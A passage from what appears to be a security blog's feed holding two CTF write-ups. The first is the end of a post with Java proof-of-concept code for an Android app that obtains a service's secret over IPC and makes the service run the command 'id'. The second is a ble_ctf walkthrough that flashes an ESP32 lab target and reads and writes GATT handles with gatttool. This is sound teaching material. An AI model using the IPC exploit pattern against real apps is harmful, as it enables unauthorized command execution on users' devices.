Toast.LENGTH_SHORT).show();  </span><br><span class="line">            <span class="keyword">return</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        buttonRun.setEnabled(<span class="literal">false</span>); </span><br><span class="line">        textOutput.setText(<span class="string">&quot;Requesting secret...&quot;</span>);  </span><br><span class="line">        mReceivedSecret = <span class="literal">null</span>; <span class="comment">// Reset previous secret  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 1. Request the secret        </span></span><br><span class="line">         <span class="type">Message</span> <span class="variable">getSecretMsg</span> <span class="operator">=</span> Message.obtain(<span class="literal">null</span>, MSG_GET_SECRET);  </span><br><span class="line">        getSecretMsg.replyTo = mReplyMessenger;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            mServiceMessenger.send(getSecretMsg);  </span><br><span class="line">            Log.d(TAG, <span class="string">&quot;Sent MSG_GET_SECRET&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;  </span><br><span class="line">            textOutput.setText(<span class="string">&quot;Error sending get_secret: &quot;</span> + e.getMessage());  </span><br><span class="line">            Log.e(TAG, <span class="string">&quot;Failed to send MSG_GET_SECRET&quot;</span>, e);  </span><br><span class="line">            buttonRun.setEnabled(<span class="literal">true</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">sendCommand</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> (!mIsBound || mReceivedSecret == <span class="literal">null</span>) &#123;  </span><br><span class="line">            textOutput.append(<span class="string">&quot;\nCannot send command (not bound or no secret)&quot;</span>);  </span><br><span class="line">            Log.e(TAG, <span class="string">&quot;sendCommand called but not ready (bound=&quot;</span> + mIsBound + <span class="string">&quot;, secret=&quot;</span> + mReceivedSecret + <span class="string">&quot;)&quot;</span>);  </span><br><span class="line">            buttonRun.setEnabled(<span class="literal">true</span>);  </span><br><span class="line">            <span class="keyword">return</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        textOutput.append(<span class="string">&quot;\nSending &#x27;id&#x27; command...&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 2. Prepare the command  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;id&quot;</span>;   </span><br><span class="line">        <span class="type">String</span> <span class="variable">doubleEncodedCommand</span> <span class="operator">=</span> doubleEncodeBase64(command);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (doubleEncodedCommand == <span class="literal">null</span>) &#123;  </span><br><span class="line">            textOutput.append(<span class="string">&quot;\nError: Failed to Base64 encode command.&quot;</span>);  </span><br><span class="line">            Log.e(TAG, <span class="string">&quot;Double Base64 encoding failed&quot;</span>);  </span><br><span class="line">            buttonRun.setEnabled(<span class="literal">true</span>);  </span><br><span class="line">            <span class="keyword">return</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 3. Send the command message  </span></span><br><span class="line">        <span class="type">Message</span> <span class="variable">runCmdMsg</span> <span class="operator">=</span> Message.obtain(<span class="literal">null</span>, MSG_RUN_COMMAND);  </span><br><span class="line">        <span class="type">Bundle</span> <span class="variable">bundle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bundle</span>();  </span><br><span class="line">        bundle.putString(KEY_SECRET, mReceivedSecret);  </span><br><span class="line">        bundle.putString(KEY_COMMAND, doubleEncodedCommand); <span class="comment">// Use the encoded command  </span></span><br><span class="line">        runCmdMsg.setData(bundle);  </span><br><span class="line">        runCmdMsg.replyTo = mReplyMessenger;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            mServiceMessenger.send(runCmdMsg);  </span><br><span class="line">            Log.d(TAG, <span class="string">&quot;Sent MSG_RUN_COMMAND&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;  </span><br><span class="line">            textOutput.append(<span class="string">&quot;\nError sending command: &quot;</span> + e.getMessage());  </span><br><span class="line">            Log.e(TAG, <span class="string">&quot;Failed to send MSG_RUN_COMMAND&quot;</span>, e);  </span><br><span class="line">            buttonRun.setEnabled(<span class="literal">true</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">doubleEncodeBase64</span><span class="params">(String input)</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">byte</span>[] singleEncoded = Base64.getEncoder().encode(input.getBytes(StandardCharsets.UTF_8));  </span><br><span class="line">            <span class="type">byte</span>[] doubleEncoded = Base64.getEncoder().encode(singleEncoded);  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(doubleEncoded, StandardCharsets.UTF_8);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            Log.e(TAG, <span class="string">&quot;Base64 encoding failed&quot;</span>, e);  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的activity_main.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span>  </span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span>  </span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>  </span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span>  </span></span><br><span class="line"><span class="tag">    <span class="attr">android:padding</span>=<span class="string">&quot;16dp&quot;</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span>        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button_run&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;Run &#x27;id&#x27; command on Watcher&quot;</span> /&gt;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span>        <span class="attr">android:id</span>=<span class="string">&quot;@+id/text_output&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">&quot;16dp&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;Output will appear here...&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:textAppearance</span>=<span class="string">&quot;@style/TextAppearance.AppCompat.Medium&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:textIsSelectable</span>=<span class="string">&quot;true&quot;</span>/&gt;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img                         lazyload                       alt="image"                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test1/Pasted%20image%2020250506124027.png"                                        ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前置分析&quot;&gt;&lt;a href=&quot;#前置分析&quot; class=&quot;headerlink&quot; title=&quot;前置分析&quot;&gt;&lt;/a&gt;前置分析&lt;/h2&gt;&lt;p&gt;题目描述&lt;br&gt;题目下载链接:&lt;a class=&quot;link&quot;   href=&quot;https://github.com/0xbi</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ble_ctf wp</title>
    <link href="http://arch3rn4r.github.io/2025/04/26/%E4%BB%8Eble-ctf%E5%AD%A6%E8%93%9D%E7%89%99/"/>
    <id>http://arch3rn4r.github.io/2025/04/26/%E4%BB%8Eble-ctf%E5%AD%A6%E8%93%9D%E7%89%99/</id>
    <published>2025-04-26T09:53:57.000Z</published>
    <updated>2025-05-02T03:03:09.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x0-前期配置"><a href="#0x0-前期配置" class="headerlink" title="0x0 前期配置"></a>0x0 前期配置</h2><p>所需设备：蓝牙适配器，刷入了blectf的esp32,能进行蓝牙操作的设备（kali或者Ubuntu）<br><strong>将blectf靶场刷入esp32</strong><br>安装<a class="link"   href="https://github.com/espressif/esptool" >esptool<i class="fas fa-external-link-alt"></i></a>(如果出现报错那么去查看“安装时报错”那条)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install esptool</span><br></pre></td></tr></table></figure><p>克隆仓库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/hackgnar/ble_ctf</span><br></pre></td></tr></table></figure><p>找到当前esp32在linux的端口，一般是&#x2F;dev&#x2F;ttyUSB0</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看当前所有串口设备</span></span><br><span class="line">/dev/tty*</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看usb口设备</span></span><br><span class="line">/dev/ttyUSB*</span><br></pre></td></tr></table></figure><p>开始烧录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ble_ctf</span><br><span class="line"></span><br><span class="line">esptool -p /dev/ttyUSB0 -b 460800 --before default_reset --after hard_reset --chip esp32  write_flash --flash_mode dio --flash_size 2MB --flash_freq 40m 0x1000 build/bootloader/bootloader.bin 0x8000 build/partition_table/partition-table.bin 0x10000 build/ble_ctf.bin</span><br></pre></td></tr></table></figure><p>一切正常没有报错的话那么就搭建完了</p><hr><p><strong>启动蓝牙</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ hciconfig</span><br><span class="line">                                                                                                        </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ hciconfig</span><br><span class="line">hci0:   Type: Primary  Bus: USB</span><br><span class="line">        BD Address: 84:E0:F4:03:0F:5E  ACL MTU: 310:10  SCO MTU: 64:8</span><br><span class="line">        DOWN RUNNING </span><br><span class="line">        RX bytes:582 acl:0 sco:0 events:30 errors:0</span><br><span class="line">        TX bytes:367 acl:0 sco:0 commands:30 errors:0</span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# hciconfig hci0 up</span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# exit</span><br><span class="line">                                                                                                        </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo hciconfig hci0 lestates</span><br><span class="line">Supported link layer states:</span><br><span class="line">        YES Non-connectable Advertising State</span><br><span class="line">        YES Scannable Advertising State</span><br><span class="line">        YES Connectable Advertising State</span><br><span class="line">        YES Directed Advertising State</span><br><span class="line">        YES Passive Scanning State</span><br><span class="line">        YES Active Scanning State</span><br><span class="line">        YES Initiating State/Connection State in Central Role</span><br><span class="line">        YES Connection State in the Peripheral Role</span><br><span class="line">        YES Non-connectable Advertising State and Passive Scanning State combination</span><br><span class="line">        YES Scannable Advertising State and Passive Scanning State combination</span><br><span class="line">        YES Connectable Advertising State and Passive Scanning State combination</span><br><span class="line">        YES Directed Advertising State and Passive Scanning State combination</span><br><span class="line">        YES Non-connectable Advertising State and Active Scanning State combination</span><br><span class="line">        YES Scannable Advertising State and Active Scanning State combination</span><br><span class="line">        YES Connectable Advertising State and Active Scanning State combination</span><br><span class="line">        YES Directed Advertising State and Active Scanning State combination</span><br><span class="line">        YES Non-connectable Advertising State and Initiating State combination</span><br><span class="line">        YES Scannable Advertising State and Initiating State combination</span><br><span class="line">        YES Non-connectable Advertising State and Central Role combination</span><br><span class="line">        YES Scannable Advertising State and Central Role combination</span><br><span class="line">        YES Non-connectable Advertising State and Peripheral Role combination</span><br><span class="line">        YES Scannable Advertising State and Peripheral Role combination</span><br><span class="line">        YES Passive Scanning State and Initiating State combination</span><br><span class="line">        YES Active Scanning State and Initiating State combination</span><br><span class="line">        YES Passive Scanning State and Central Role combination</span><br><span class="line">        YES Active Scanning State and Central Role combination</span><br><span class="line">        YES Passive Scanning State and Peripheral Role combination</span><br><span class="line">        YES Active Scanning State and Peripheral Role combination</span><br><span class="line">        YES Initiating State and Central Role combination/Central Role and Central Role combination</span><br><span class="line">                                                                                                        </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo hcitool lescan</span><br><span class="line">LE Scan ...</span><br><span class="line">64:B7:08:61:B9:7E BLECTF</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p>这里会用到两种工具，gatttool和bleah,kali自带gatttool<br>查看gatttool的help来学会其用法<br>在这些指令里查找我们需要的参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">└─$ gatttool --help-all            </span><br><span class="line">Usage:</span><br><span class="line">  gatttool [OPTION?]</span><br><span class="line"></span><br><span class="line">Help Options:</span><br><span class="line">  -h, --help                                Show help options</span><br><span class="line">  --help-all                                Show all help options</span><br><span class="line">  --help-gatt                               Show all GATT commands</span><br><span class="line">  --help-params                             Show all Primary Services/Characteristics arguments</span><br><span class="line">  --help-char-read-write                    Show all Characteristics Value/Descriptor Read/Write arguments</span><br><span class="line"></span><br><span class="line">GATT commands</span><br><span class="line">  --primary                                 Primary Service Discovery</span><br><span class="line">  --characteristics                         Characteristics Discovery</span><br><span class="line">  --char-read                               Characteristics Value/Descriptor Read</span><br><span class="line">  --char-write                              Characteristics Value Write Without Response (Write Command)</span><br><span class="line">  --char-write-req                          Characteristics Value Write (Write Request)</span><br><span class="line">  --char-desc                               Characteristics Descriptor Discovery</span><br><span class="line">  --listen                                  Listen for notifications and indications</span><br><span class="line"></span><br><span class="line">Primary Services/Characteristics arguments</span><br><span class="line">  -s, --start=0x0001                        Starting handle (optional)</span><br><span class="line">  -e, --end=0xffff                          Ending handle (optional)</span><br><span class="line">  -u, --uuid=0x1801                         UUID16 or UUID128 (optional)</span><br><span class="line"></span><br><span class="line">Characteristics Value/Descriptor Read/Write arguments</span><br><span class="line">  -a, --handle=0x0001                       Read/Write characteristic by handle (required)</span><br><span class="line">  -n, --value=0x0001                        Write characteristic value (required for write operation)</span><br><span class="line"></span><br><span class="line">Application Options:</span><br><span class="line">  -i, --adapter=hciX                        Specify local adapter interface</span><br><span class="line">  -b, --device=MAC                          Specify remote Bluetooth address</span><br><span class="line">  -t, --addr-type=[public | random]         Set LE address type. Default: public</span><br><span class="line">  -m, --mtu=MTU                             Specify the MTU size</span><br><span class="line">  -p, --psm=PSM                             Specify the PSM for GATT/ATT over BR/EDR</span><br><span class="line">  -l, --sec-level=[low | medium | high]     Set security level. Default: low</span><br><span class="line">  -I, --interactive                         Use interactive mode</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p>关于这个挑战的<a class="link"   href="https://github.com/hackgnar/ble_ctf/blob/master/main/gatts_table_creat_demo.c" >源代码<i class="fas fa-external-link-alt"></i></a>在main&#x2F;gatts_table_creat_demo.c文件里<br>服务器通过内部变量(<code>flag_state</code>数组、<code>score</code>计数器)跟踪每个挑战是否完成<br>这是题目们对应的标志</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint16_t</span> GATTS_SERVICE_UUID_TEST                   = <span class="number">0x00FF</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint16_t</span> GATTS_CHAR_UUID_SCORE                     = <span class="number">0xFF01</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint16_t</span> GATTS_CHAR_UUID_FLAG                      = <span class="number">0xFF02</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint16_t</span> GATTS_CHAR_UUID_FLAG_SIMPLE_READ          = <span class="number">0xFF03</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint16_t</span> GATTS_CHAR_UUID_FLAG_MD5                  = <span class="number">0xFF04</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint16_t</span> GATTS_CHAR_UUID_FLAG_WRITE_ANYTHING       = <span class="number">0xFF05</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint16_t</span> GATTS_CHAR_UUID_FLAG_WRITE_ASCII          = <span class="number">0xFF06</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint16_t</span> GATTS_CHAR_UUID_FLAG_WRITE_HEX            = <span class="number">0xFF07</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint16_t</span> GATTS_CHAR_UUID_FLAG_SIMPLE_WRITE2_READ   = <span class="number">0xFF08</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint16_t</span> GATTS_CHAR_UUID_FLAG_SIMPLE_WRITE2        = <span class="number">0xFF09</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint16_t</span> GATTS_CHAR_UUID_FLAG_BRUTE_WRITE          = <span class="number">0xFF0a</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint16_t</span> GATTS_CHAR_UUID_FLAG_READ_ALOT            = <span class="number">0xFF0b</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint16_t</span> GATTS_CHAR_UUID_FLAG_NOTIFICATION         = <span class="number">0xFF0c</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint16_t</span> GATTS_CHAR_UUID_FLAG_INDICATE_READ        = <span class="number">0xFF0d</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint16_t</span> GATTS_CHAR_UUID_FLAG_INDICATE             = <span class="number">0xFF0e</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint16_t</span> GATTS_CHAR_UUID_FLAG_NOTIFICATION_MULTI   = <span class="number">0xFF0f</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint16_t</span> GATTS_CHAR_UUID_FLAG_INDICATE_MULTI_READ  = <span class="number">0xFF10</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint16_t</span> GATTS_CHAR_UUID_FLAG_INDICATE_MULTI       = <span class="number">0xFF11</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint16_t</span> GATTS_CHAR_UUID_FLAG_MAC                  = <span class="number">0xFF12</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint16_t</span> GATTS_CHAR_UUID_FLAG_MTU                  = <span class="number">0xFF13</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint16_t</span> GATTS_CHAR_UUID_FLAG_WRITE_RESPONSE       = <span class="number">0xFF14</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint16_t</span> GATTS_CHAR_UUID_FLAG_HIDDEN_NOTIFY        = <span class="number">0xFF15</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint16_t</span> GATTS_CHAR_UUID_FLAG_CRAZY                = <span class="number">0xFF16</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint16_t</span> GATTS_CHAR_UUID_FLAG_TWITTER              = <span class="number">0xFF17</span>;</span><br></pre></td></tr></table></figure><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><p>基础验证<br>这里是基本的句柄写入，也可以用来测试当前环境是否可用，输完第一句后esp32会出现一个蓝色的灯代表连接好了<br>并且在这里说一下提交的要求：<br>默认情况下，读取前<strong>20</strong>个字节(如果您使用的是 gatttool，请确保使用 xxd 将其转换为<strong>十六进制</strong>。如果你使用的是 bleah，你可以将其作为字符串值发送)并将其写入句柄<strong>0x002c</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Score: 0/20</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;12345678901234567890&quot;|xxd -ps)</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Score:1 /20</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>解析指令<br>这是主要部分</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a</span><br></pre></td></tr></table></figure><ul><li>-b指定目标蓝牙</li><li>–char-read 指定要执行的操作</li><li>-a 指定句柄<br>后面的部分是对数据的处理，过滤我们所需的信息<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x2-查看及提交句柄"><a href="#0x2-查看及提交句柄" class="headerlink" title="0x2 查看及提交句柄"></a>0x2 查看及提交句柄</h2><p>%% 查看 handle 的 ascii 值 0x002e 并将其提交给 flag submision handle 0x002c。如果您使用的是 gatttool，请确保使用 xxd 将其转换为十六进制。如果你使用的是 bleah，你可以将其作为字符串值发送 %%</p><p>进行拆解<br>现在需要读取目标蓝牙的0x002e的值</p><ul><li>指定目标 -b 64:B7:08:61:B9:7E </li><li>读取操作  –char-read </li><li>指定句柄 -a 0x002e<br>因此指令为：<code>gatttool -b 64:B7:08:61:B9:7E  --char-read  -a 0x002e</code><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E  --char-read  -a 0x002e</span><br><span class="line">Characteristic value/descriptor: 64 32 30 35 33 30 33 65 30 39 39 63 65 66 66 34 34 38 33 35 </span><br><span class="line"></span><br></pre></td></tr></table></figure>出现的是原始数据，我们需要对其进行处理<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002e|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">d205303e099ceff44835</span><br></pre></td></tr></table></figure>读取成功<br>接下来是写操作，需要将得到的值传递给句柄0x002c</li><li>指定目标 -b 64:B7:08:61:B9:7E </li><li>写操作 ，写操作这里有两种 ，–char-write无响应，–char-write-req有响应，推荐使用–char-writr-req<ul><li>–char-write                              Characteristics Value Write Without Response (Write Command)</li><li>–char-write-req                          Characteristics Value Write (Write Request)</li></ul></li><li>指定句柄 -a 0x002c  读写操作都是使用-a指定句柄</li><li>传入要写入指定句柄的数据 -n d205303e099ceff44835<ul><li>题目要求为“请确保使用 xxd 将其转换为十六进制”，因此<code>-n $(echo -n &quot;d205303e099ceff44835&quot;|xxd -ps)</code><br>总的指令就是：<code>gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;d205303e099ceff44835&quot;|xxd -ps)</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;d205303e099ceff44835&quot;|xxd -ps)</span><br></pre></td></tr></table></figure>成功<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E  --char-read  -a 0x002e</span><br><span class="line">Characteristic value/descriptor: 64 32 30 35 33 30 33 65 30 39 39 63 65 66 66 34 34 38 33 35 </span><br><span 